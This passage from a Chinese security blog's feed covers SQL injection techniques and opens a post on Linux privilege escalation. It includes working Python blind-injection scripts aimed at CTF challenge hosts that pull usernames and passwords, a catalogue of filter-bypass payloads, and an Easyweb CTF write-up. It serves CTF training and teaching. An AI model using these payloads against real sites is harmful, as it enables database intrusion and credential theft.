print(&quot;请输入要操作的内容：\n1.爆当前数据库\n2.爆数据表开始行号\n3.爆数据表\n4.爆字段值开始行号\n5.爆字段值\n6.爆数据\n7.爆所有数据库&quot;)</span><br><span class="line">        types &#x3D; int(input())</span><br><span class="line">        if types &#x3D;&#x3D; 1:</span><br><span class="line">            current_db(url)</span><br><span class="line">        elif types &#x3D;&#x3D; 2 or types &#x3D;&#x3D; 3:</span><br><span class="line">            print(&quot;请输入已经得到的数据库名:&quot;,end&#x3D;&#39;&#39;)</span><br><span class="line">            database &#x3D; input()</span><br><span class="line">            if types &#x3D;&#x3D; 2:</span><br><span class="line">                tables_n(url,database)</span><br><span class="line">            elif types &#x3D;&#x3D; 3:</span><br><span class="line">                print(&quot;爆数据表开始行号:&quot;,end&#x3D;&#39;&#39;)</span><br><span class="line">                n &#x3D; int(input())</span><br><span class="line">                tables(url,database,n)</span><br><span class="line">        elif types &#x3D;&#x3D; 4 or types &#x3D;&#x3D; 5:</span><br><span class="line">            print(&quot;请输入已经得到的数据库名:&quot;,end&#x3D;&#39;&#39;)</span><br><span class="line">            database &#x3D; input()</span><br><span class="line">            print(&quot;请输入已经得到的数据表名:&quot;,end&#x3D;&#39;&#39;)</span><br><span class="line">            table &#x3D; input()</span><br><span class="line">            if types &#x3D;&#x3D; 4:</span><br><span class="line">                columns_n(url,database,table)</span><br><span class="line">            elif types &#x3D;&#x3D; 5:</span><br><span class="line">                print(&quot;爆字段值开始行号:&quot;,end&#x3D;&#39;&#39;)</span><br><span class="line">                n &#x3D; int(input())</span><br><span class="line">                columns(url,database,table,n)</span><br><span class="line">        elif types &#x3D;&#x3D; 6:</span><br><span class="line">            print(&quot;请输入要查询的数据表名:&quot;,end&#x3D;&#39;&#39;)</span><br><span class="line">            table &#x3D; input()</span><br><span class="line">            datas(url,table)</span><br><span class="line">        else:</span><br><span class="line">            dbs(url)</span><br></pre></td></tr></table></figure><h2 id="handler"><a href="#handler" class="headerlink" title="handler"></a>handler</h2><p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。<br>HANDLER语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表。<br>用法:</p><p> HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。<br>HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。<br>HANDLER tbl_name CLOSE来关闭打开的句柄。<br>最后</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">';</span></span><br><span class="line"><span class="string">handler FlagHere open;</span></span><br><span class="line"><span class="string">handler FlagHere read first;</span></span><br><span class="line"><span class="string">handler FlagHere close;#</span></span><br></pre></td></tr></table></figure><h2 id="异或布尔注入"><a href="#异或布尔注入" class="headerlink" title="异或布尔注入"></a>异或布尔注入</h2><p>异或是一种逻辑运算，运算法则简言之就是：两个条件相同（同真或同假）即为假（0），两个条件不同即为真（1），null与任何条件做异或运算都为null，如果从数学的角度理解就是，空集与任何集合的交集都为空。<br>mysql里异或运算符为^ 或者 xor</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">两个同为真的条件做异或，结果为假</span><br><span class="line">两个同为假的条件做异或，结果为假</span><br><span class="line">一个条件为真，一个条件为假，结果为真</span><br><span class="line">null与任何条件（真、假、null）做异或，结果都为null</span><br></pre></td></tr></table></figure><p>例题：<br>[Black Watch 入群题]Web  </p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="comment">#查库名</span></span><br><span class="line">payload1 = <span class="string">'1^(ascii(substr((select(database())),&#123;&#125;,1))&gt;&#123;&#125;)^1'</span>    <span class="comment">#库名为news</span></span><br><span class="line"><span class="comment">#查表名</span></span><br><span class="line">payload2 = <span class="string">'1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=\'news\')),&#123;&#125;,1))&gt;&#123;&#125;)^1'</span> <span class="comment">#表名为admin,contents</span></span><br><span class="line">payload3 = <span class="string">'1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=\'admin\')),&#123;&#125;,1))&gt;&#123;&#125;)^1'</span>   <span class="comment">#admin表里有id,username,password,is_enable</span></span><br><span class="line">                                                                                                                                              <span class="comment"># contents表里有id,title,content,is_enable</span></span><br><span class="line"><span class="comment">#查字段值</span></span><br><span class="line">payload4 = <span class="string">'1^(ascii(substr((select(group_concat(username,0x23,password))from(admin)),&#123;&#125;,1))&gt;&#123;&#125;)^1'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    low =<span class="number">28</span></span><br><span class="line">    high =<span class="number">137</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(low &lt; high):</span><br><span class="line">        url = <span class="string">'http://37d5f4b8-3812-4ccf-92da-27dc2a76321f.node3.buuoj.cn/backend/content_detail.php?id='</span></span><br><span class="line">        payload = payload4.format(i,mid)</span><br><span class="line">        url+=payload</span><br><span class="line">        <span class="comment">#print(url)</span></span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        text = str(r.json())</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"札师傅缺个女朋友"</span> <span class="keyword">in</span> text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span>(chr(mid)==<span class="string">''</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag +=chr(mid)</span><br><span class="line">    print(flag)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h1 id="sql注入绕过"><a href="#sql注入绕过" class="headerlink" title="sql注入绕过"></a>sql注入绕过</h1><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>1.使用注释符<code>/**/</code>绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT/**/name/**/FROM/**/table</span><br></pre></td></tr></table></figure><p>2.使用url编码绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%a0 发出去就是空格的意思，但是需要在burp中抓包后修改</span><br></pre></td></tr></table></figure><p>3.使用浮点数绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from users <span class="built_in">where</span> id=8E0union select 1,2,3</span><br><span class="line">等价于</span><br><span class="line">select * from users <span class="built_in">where</span> id=8.0 select 1,2,3</span><br></pre></td></tr></table></figure><p>4.使用Tab替代空格<br>5.使用两个空格替代一个空格<br>6.使用括号绕过<br>如果空格被过滤，括号没有被过滤，可以用括号绕过。 在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p><p>例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select(user())from dual <span class="built_in">where</span>(1=1)and(2=2)</span><br></pre></td></tr></table></figure><p>这种过滤方法常常用于time based盲注,例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%27and(sleep(ascii(mid(database()from(1)<span class="keyword">for</span>(1)))=109))%23</span><br></pre></td></tr></table></figure><h2 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h2><p>使用16进制绕过<br>会使用到引号的地方一般是在最后的where子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name  from information_schema.columns <span class="built_in">where</span> table_name=<span class="string">"users"</span></span><br></pre></td></tr></table></figure><p>这个时候如果引号被过滤了，那么上面的where子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。 users的十六进制的字符串是7573657273。那么最后的sql语句就变为了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name  from information_schema.columns <span class="built_in">where</span> table_name=0x7573657273</span><br></pre></td></tr></table></figure><h2 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h2><p>1.使用from关键字绕过<br>对于substr()和mid()这两个方法可以使用from to的方式来解决：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select substr(database() from 1 <span class="keyword">for</span> 1);</span><br><span class="line">select mid(database() from 1 <span class="keyword">for</span> 1);</span><br></pre></td></tr></table></figure><p>2.使用join关键字绕过  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2</span><br><span class="line">等价于</span><br><span class="line">union select * from (select 1)a join (select 2)b</span><br></pre></td></tr></table></figure><p>3.使用like关键字绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select ascii(mid(user(),1,1))=80   <span class="comment">#等价于</span></span><br><span class="line">select user() like <span class="string">'r%'</span></span><br></pre></td></tr></table></figure><p>4.使用offset关键字绕过<br>对于limit可以使用offset来绕过：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from news <span class="built_in">limit</span> 0,1</span><br><span class="line">等价于</span><br><span class="line">select * from news <span class="built_in">limit</span> 1 offset 0</span><br></pre></td></tr></table></figure><h2 id="过滤注释符（-和-–-）"><a href="#过滤注释符（-和-–-）" class="headerlink" title="过滤注释符（ # 和 – ）"></a>过滤注释符（ # 和 – ）</h2><p>手动闭合引号，不使用注释符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1<span class="string">' union select 1,2,3||'</span>1</span><br></pre></td></tr></table></figure><p>或者：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1<span class="string">' union select 1,2,'</span>3</span><br></pre></td></tr></table></figure><h2 id="过滤比较符号-（-lt-和-gt-）"><a href="#过滤比较符号-（-lt-和-gt-）" class="headerlink" title="过滤比较符号 （ &lt; 和 &gt; ）"></a>过滤比较符号 （ &lt; 和 &gt; ）</h2><p>1.使用<strong>greatest()、least（）函数</strong>绕过<br>greatest()、least（）：（前者返回最大值，后者返回最小值）</p><p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了</p><p>最常见的一个盲注的sql语句：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users <span class="built_in">where</span> id=1 and ascii(substr(database(),0,1))&gt;64</span><br></pre></td></tr></table></figure><p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值</p><p>那么上面的这条sql语句可以使用greatest变为如下的子句:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users <span class="built_in">where</span> id=1 and greatest(ascii(substr(database(),0,1)),64)=64</span><br></pre></td></tr></table></figure><ol start="2"><li>使用<strong>between and</strong>绕过<br>between a and b：返回a，b之间的数据，不包含b。</li></ol><h2 id="过滤等号（-）"><a href="#过滤等号（-）" class="headerlink" title="过滤等号（ = ）"></a>过滤等号（ = ）</h2><p>使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;   </p><h2 id="过滤union，select，where等"><a href="#过滤union，select，where等" class="headerlink" title="过滤union，select，where等"></a>过滤union，select，where等</h2><p>1.使用注释符绕过<br>常用注释符：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//、--、/**/、<span class="comment">#、--+、---、;、%00、--a</span></span><br></pre></td></tr></table></figure><p>用法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U/**/ NION /**/ SE/**/ LECT /**/user，<span class="built_in">pwd</span> from user</span><br></pre></td></tr></table></figure><p>2.使用大小写绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1<span class="string">'UnIoN/**/SeLeCT</span></span><br></pre></td></tr></table></figure><p>3.使用内联注释绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1<span class="string">'/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#</span></span><br></pre></td></tr></table></figure><p>4.使用双关键字绕过（若删除掉第一个匹配的union就能绕过）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1<span class="string">'UNIunionONSeLselectECT1,2,3–-</span></span><br></pre></td></tr></table></figure><p>5.使用加号+拆解字符串</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or <span class="string">'swords'</span> =<span class="string">'sw'</span> +<span class="string">'ords'</span> ；EXEC(<span class="string">'IN'</span> +<span class="string">'SERT INTO'</span>+<span class="string">'…..'</span> )</span><br></pre></td></tr></table></figure><p>6.使用语法新特性绕过屏蔽select<br>在MySQL 8.0.19版本后，mysql推出了一些新特性，使我们可以不使用select就能够取数据</p><p>TABLE 语句<br>可以直接列出表的全部内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]</span><br></pre></td></tr></table></figure><p>TABLE是MySQL 8.0.19中引入的DML语句，它返回命名表的行和列，类似于SELECT。<br>支持UNION联合查询、ORDER BY排序、LIMIT子句限制产生的行数。     </p><p>如 select * from user 就可以用 table user 替代来进行绕过</p><p>VALUES 语句<br>可以列出一行的值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">VALUES row_constructor_list [ORDER BY column_designator] [LIMIT BY number]</span><br><span class="line"></span><br><span class="line">row_constructor_list:</span><br><span class="line"> ROW(value_list)[, ROW(value_list)][, ...]</span><br><span class="line"></span><br><span class="line">value_list:</span><br><span class="line"> value[, value][, ...]</span><br><span class="line"></span><br><span class="line">column_designator:</span><br><span class="line"> column_index</span><br></pre></td></tr></table></figure><p>例如直接列出一行的值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VALUES ROW(1,2,3), ROW(4,5,6);</span><br></pre></td></tr></table></figure><p>VALUES和TABLES语句的结果都是表数据，可以结合起来使用</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>使用多语句的方式执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> @a:=0x73656c656374202a2066726f6d2074657374;</span><br><span class="line">prepare s from @a;</span><br><span class="line">execute s;</span><br></pre></td></tr></table></figure><p><a href="https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/" target="_blank" rel="noopener">https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/</a>       </p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h2><p>访问robots.txt，得知有bak备份<br>image.php.bak</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;﻿?php</span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line">$id=<span class="keyword">isset</span>($_GET[<span class="string">"id"</span>])?$_GET[<span class="string">"id"</span>]:<span class="string">"1"</span>;</span><br><span class="line">$path=<span class="keyword">isset</span>($_GET[<span class="string">"path"</span>])?$_GET[<span class="string">"path"</span>]:<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$id=addslashes($id);</span><br><span class="line">$path=addslashes($path);</span><br><span class="line"></span><br><span class="line">$id=str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,$id);</span><br><span class="line">$path=str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,$path);</span><br><span class="line"></span><br><span class="line">$result=mysqli_query($con,<span class="string">"select * from images where id='&#123;$id&#125;' or path='&#123;$path&#125;'"</span>);</span><br><span class="line">$row=mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line">$path=<span class="string">"./"</span> . $row[<span class="string">"path"</span>];</span><br><span class="line">header(<span class="string">"Content-Type: image/jpeg"</span>);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure><p>addslashes()函数，这个函数会把特殊的字符转义。</p><p>比如:单引号会被转义成’,斜杠会转义为.</p><p>第十行的str_replace会把”\0”,”%00”,”\‘“,”‘“中的任意一个替换成空。</p><p>我们可根据这个绕过当传入id=\0时，这样会被转义成\0，然后\0被替换为空，只剩下了一个\，这个反斜杠正好可以转义后面的查询语句中闭合id的单引号。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from images where id&#x3D;&#39;\&#39; or path&#x3D;’+&#123;$path&#125;’</span><br></pre></td></tr></table></figure><p>所以我们可以在path处注入我们的新语句，</p><p>由于没有查询结果回显，所以此处是盲注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://18d42f36-2704-43a9-8690-b52a3c0a95e8.node3.buuoj.cn/image.php?id=\\0&amp;path=or 1="</span></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line">last=<span class="string">"tmp"</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>( last != result ):</span><br><span class="line">i=i+<span class="number">1</span></span><br><span class="line">head=<span class="number">32</span></span><br><span class="line">tail=<span class="number">127</span></span><br><span class="line"><span class="keyword">while</span> head &lt; tail :</span><br><span class="line">mid = ( head + tail ) &gt;&gt; <span class="number">1</span></span><br><span class="line"><span class="comment">#payload = "if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() ),%d,1))&gt;%d,1,-1)%%23"%(i,mid)</span></span><br><span class="line"><span class="comment">#payload = "if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273 ),%d,1))&gt;%d,1,-1)%%23"%(i,mid)</span></span><br><span class="line">payload = <span class="string">"if(ascii(substr((select group_concat(password) from users),%d,1))&gt;%d,1,-1)%%23"</span>%(i,mid)</span><br><span class="line"><span class="comment">#print(url+payload)</span></span><br><span class="line">r = requests.get(url+payload)</span><br><span class="line"><span class="keyword">if</span> <span class="string">b"JFIF"</span> <span class="keyword">in</span> r.content :</span><br><span class="line">head = mid + <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">tail = mid</span><br><span class="line">            </span><br><span class="line">last = result</span><br><span class="line"><span class="keyword">if</span> chr(head)!=<span class="string">' '</span> :</span><br><span class="line">result += chr(head)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><p>可看此文章<br><a href="https://www.cnblogs.com/Vinson404/p/7253255.html" target="_blank" rel="noopener">https://www.cnblogs.com/Vinson404/p/7253255.html</a><br>参考文章:<br>史上最水的MYSQL注入总结：<a href="https://xz.aliyun.com/t/3992" target="_blank" rel="noopener">https://xz.aliyun.com/t/3992</a><br>sql注入总结: <a href="https://xz.aliyun.com/t/2869#toc-12" target="_blank" rel="noopener">https://xz.aliyun.com/t/2869#toc-12</a><br>ctfwiki: <code>https://ctf-wiki.github.io/ctf-wiki/web/sqli/#_13</code><br>一种新的MySQL下Update、Insert注入方法<a href="https://www.anquanke.com/post/id/85487" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85487</a><br>解析php sprintf函数漏洞 <a href="https://blog.csdn.net/WQ_BCJ/article/details/85057447" target="_blank" rel="noopener">https://blog.csdn.net/WQ_BCJ/article/details/85057447</a></p><p>PHP sprintf格式化字符串漏洞 <a href="https://mp.weixin.qq.com/s/eEJPvbH7xwINjQvJGY_A_A" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/eEJPvbH7xwINjQvJGY_A_A</a><br>REGEXP注入与LIKE注入学习笔记<a href="https://xz.aliyun.com/t/8003" target="_blank" rel="noopener">https://xz.aliyun.com/t/8003</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>linux提权总结</title>
    <link href="https://blog.cfyqy.com/article/5501d644.html"/>
    <id>https://blog.cfyqy.com/article/5501d644.html</id>
    <published>2021-06-21T09:03:44.000Z</published>
    <updated>2021-06-28T07:46:13.425Z</updated>
    
    <content type="html"><![CDATA[<p>当拿到了一台Linux服务器的低权限账号，想要通过技术手段提权至 root 用户权限，以执行更多的操作。</p><a id="more"></a><h1 id="linux权限"><a href="#linux权限" class="headerlink" title="linux权限"></a>linux权限</h1><h2 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h2><p>在Linux系统中，用户是分角色的，角色不同，对应权限不同。用户角色通过UID和GID识别。特别是UID，一个UID是唯一标识一个系统用户的账号。</p><ul><li>超级用户（0）：默认是root用户，其UID和GID都是0。root用户在每台Unix和Linux系统中都是唯一且真是存在的，通过它可以登陆系统，操作系统中任何文件执行系统中任何命令，拥有最高管理权限。</li><li>普通用户（1~499）：系统中大多数用户都是普通用户，实际中也一般使用普通用户操作，需要权限是用sudo命令提升权限。</li><li>虚拟用户（500~65535）：与真实的普通用户区分开来，这类用户最大特点是安装系统后默认就会存在，且默认情况大多数不能登陆系统，其在/etc/passwd文件中，最后字段为/sbin/nologin。是系统正常运行不可缺少的，主要是方便系统管理，满足相应的系统进程对文件属主的要求</li></ul><h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rw-r--r--  1 root root      56 Jun 16 23:29 hash.txt</span><br></pre></td></tr></table></figure><p>这里可以分为7个字段。</p><p>第一组数据 -rw-r–r–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">第一位：</span><br><span class="line">-: 代表普通文件</span><br><span class="line">d：代表目录</span><br><span class="line">l：代表软链接</span><br><span class="line">b：代表块文件</span><br><span class="line">c：代表字符设备</span><br><span class="line"></span><br><span class="line">第二及后面几位,分别三个为一组：</span><br><span class="line"></span><br><span class="line">rw-r--r-- 代表文件所属的权限</span><br><span class="line"></span><br><span class="line">r : 文件可读。w : 文件可修改。- : 表示暂时没有其他权限。x : 表示可执行</span><br><span class="line"></span><br><span class="line">rw- 表示文件所拥有者的权限。</span><br><span class="line">r-- 表示文件所在组的用户的权限。</span><br><span class="line">r-- 表示其他组的用户的权限。</span><br></pre></td></tr></table></figure><p>第二组数据</p><ul><li>如果文件类型为目录，表示目录下的字目录个数</li><li>如果文件类型是普通文件，这个数据就表示这个文件的硬链接个数</li></ul><p>第三组数据 root . 表示该文件所有者为 root 用户<br>第四组数据 root. 表示该文件所在组为root 组<br>第五组数据 56 表示文件的大小为多少字节。如果为一个目录，则为4096。           第六组数据表示最后一次修改时间<br>第七组数据表示文件名称   </p><p>如果为目录，r 表示可以进入该目录进行查看。 w 表示文件可以进行增加。x 表示可以进入这个目录</p><p>同样的，可以用数字代替，r=4,w=2,x=1。     </p><p>SUID/SGID/SBIT的作用？ </p><p>1 SUID</p><p>当s出现在文件拥有者的x权限上时,如我们上面看到的/usr/bin/passwd这个文件的权限时-rwsr-xr-x,此时就被称为SET UID简称SUID.SUID对于一个文件有什么限制和功能呢？</p><p>SUID权限仅对二进制可执行文件有效，执行者对于该文件具有x的权限，本权限仅在执行该文件的过程中有效，执行者将具有该文件拥有者的权限。</p><p>例如：</p><p>普通用户用passwd修改自己的命令，实际上最终更改的是/etc/passwd文件. 此文件时用户管理配置文件,只有root权限才能更改。<br>既然是root用户才拥有此权限，为什么我们可以通过passwd命令来修改密码呢，那这就要归功于passwd设置了suid权限位了。<br>此时普通用户通过执行passwd命令，临时拥有root权限，间接的修改/etc/passwd，以达到修改自己密码的权限。</p><p>2 SGID</p><p>当s出现在目录或文件所属群的x权限上时，此时就称为SET GID简称SGID,那SGID对文件和目录分部有哪些功能呢？</p><p>2.1 SGID对目录</p><p>使用者若对于此目录具有 r 与 x 的权限时，该使用者能够进入此目录</p><p>使用者在此目录下的群组将会变成该目录的群组</p><p>若使用者在此目录下具有 w 的权限(可以新建文件)，则使用者所创建的新文件，该新文件的群组与此目录的群组相同</p><p>2.2 SGID对文件</p><p>SGID 对二进制可执行文件有效</p><p>程式执行者对于该文件来说，需具备 x 的权限</p><p>执行者在执行的过程中将会获得该文件群组的支援（用于改文件群组的权限）</p><p>3 SBIT</p><p>当s出现在目录其他用户的x权限上时，此时就称为Sticky Bit简称SBIT,那SBIT有哪些限制和作用呢?</p><p>仅对目录有效，对文件无效</p><p>当使用者在该目录下建立文件或目录时(有权限的情况下)，仅自己与 root 才有权力删除新建的目录或文件</p><p>提权思路：大概思路是通过信息搜集查找可利用的文件/脚本/软件/用户/内核漏洞/恶意劫持/特定平台漏洞/框架漏洞/组件/等，写入或执行恶意命令/脚本/shell/添加高权限用户，提权成功，然后进一步利用。   </p><h1 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 